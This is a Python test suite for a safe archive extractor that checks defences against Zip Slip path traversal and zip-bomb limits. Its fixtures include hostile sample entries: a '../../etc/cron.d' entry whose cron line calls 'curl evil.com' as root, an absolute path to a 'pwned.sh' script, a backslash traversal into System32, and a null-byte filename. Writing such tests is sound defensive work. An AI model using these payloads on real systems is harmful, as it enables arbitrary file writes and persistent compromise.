"""Unit and security test suite for Safe Archive Extraction & Zip Slip Defense.
Resolves Issue #292: Zip Slip -> Arbitrary File Write via Archive Extraction ($150 USD).
"""

import io
import os
import zipfile
import pytest
from scripts.safe_archive_extractor import (
    SafeArchiveExtractor,
    ZipSlipError,
    ZipBombError,
)


@pytest.fixture
def extractor():
    return SafeArchiveExtractor()


def create_in_memory_zip(entries: dict) -> io.BytesIO:
    """Helper to generate a zip file in-memory with custom filename keys and contents."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in entries.items():
            if isinstance(content, str):
                content = content.encode("utf-8")
            zf.writestr(name, content)
    buf.seek(0)
    return buf


def test_safe_extraction_legitimate_archive(extractor, tmp_path):
    target_dir = tmp_path / "extracted"
    entries = {
        "readme.txt": "Welcome to the application",
        "docs/setup.md": "Step 1: Install dependencies",
        "src/core/app.py": "print('running')",
    }
    archive = create_in_memory_zip(entries)
    extracted = extractor.extract(archive, str(target_dir))

    assert len(extracted) == 3
    assert os.path.exists(target_dir / "readme.txt")
    assert os.path.exists(target_dir / "docs" / "setup.md")
    assert os.path.exists(target_dir / "src" / "core" / "app.py")

    with open(target_dir / "readme.txt", "r") as f:
        assert f.read() == "Welcome to the application"


def test_zip_slip_traversal_dot_dot_blocked(extractor, tmp_path):
    target_dir = tmp_path / "extracted"
    entries = {
        "safe.txt": "normal file",
        "../../etc/cron.d/malicious": "* * * * * root curl evil.com",
    }
    archive = create_in_memory_zip(entries)

    with pytest.raises(ZipSlipError, match="Directory traversal sequence detected"):
        extractor.extract(archive, str(target_dir))

    assert not os.path.exists(tmp_path / "etc" / "cron.d" / "malicious")


def test_zip_slip_absolute_path_blocked(extractor, tmp_path):
    target_dir = tmp_path / "extracted"
    entries = {
        "/var/tmp/pwned.sh": "echo owned",
    }
    archive = create_in_memory_zip(entries)

    with pytest.raises(ZipSlipError, match="Directory traversal sequence detected"):
        extractor.extract(archive, str(target_dir))


def test_zip_slip_backslash_traversal_blocked(extractor, tmp_path):
    target_dir = tmp_path / "extracted"
    entries = {
        "..\\..\\Windows\\System32\\calc.exe": "payload",
    }
    archive = create_in_memory_zip(entries)

    with pytest.raises(ZipSlipError, match="Directory traversal sequence detected"):
        extractor.extract(archive, str(target_dir))


def test_zip_null_byte_filename_blocked(extractor, tmp_path):
    target_dir = tmp_path / "extracted"
    with pytest.raises(ZipSlipError, match="Null byte detected"):
        extractor.validate_member_path("benign.txt\x00.exe", str(target_dir))


def test_zip_bomb_uncompressed_size_exceeded(tmp_path):
    # Extractor with very small limit (1 KB)
    tiny_extractor = SafeArchiveExtractor(max_total_uncompressed_bytes=1024)
    target_dir = tmp_path / "extracted"
    large_content = "A" * 2048
    archive = create_in_memory_zip({"huge.txt": large_content})

    with pytest.raises(ZipBombError, match="Uncompressed archive size limit exceeded"):
        tiny_extractor.extract(archive, str(target_dir))


def test_zip_bomb_file_count_exceeded(tmp_path):
    tiny_extractor = SafeArchiveExtractor(max_file_count=3)
    target_dir = tmp_path / "extracted"
    entries = {f"file_{i}.txt": "data" for i in range(5)}
    archive = create_in_memory_zip(entries)

    with pytest.raises(ZipBombError, match="File count limit exceeded"):
        tiny_extractor.extract(archive, str(target_dir))
